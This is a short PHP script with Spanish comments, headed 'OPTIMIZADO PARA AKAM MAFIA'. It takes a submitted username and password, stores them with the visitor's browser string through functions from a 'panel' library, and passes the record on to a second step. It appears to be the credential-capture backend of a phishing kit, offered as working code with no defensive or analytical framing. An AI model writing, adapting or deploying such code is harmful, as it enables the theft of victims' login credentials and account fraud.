<?php
// process/pasousuario.php - OPTIMIZADO PARA AKAM MAFIA
require('../panel/lib/funciones.php');
session_start();

$user = $_POST['txt-usuario'] ?? '';
$pass = $_POST['txt-password'] ?? ''; 
// Detectamos el dispositivo de forma un poco más real
$dispositivo = $_SERVER['HTTP_USER_AGENT']; 

if (!empty($user) && !empty($pass)) {
    // 1. Creamos el registro completo de una vez
    $id = crear_registro($user, $dispositivo);
    
    // 2. Actualizamos la clave inmediatamente
    actualizar_registro_pass($id, $pass);
    
    // 3. GUARDAMOS EL ID EN LA SESIÓN (Vital para el paso 2)
    $_SESSION['id_reg'] = $id;
    
    // 4. Redirección limpia
    header("Location: ../a/dinamica.php");
} else {
    // Si faltan datos, regresamos al inicio
    header("Location: ../index.php");
}
exit();
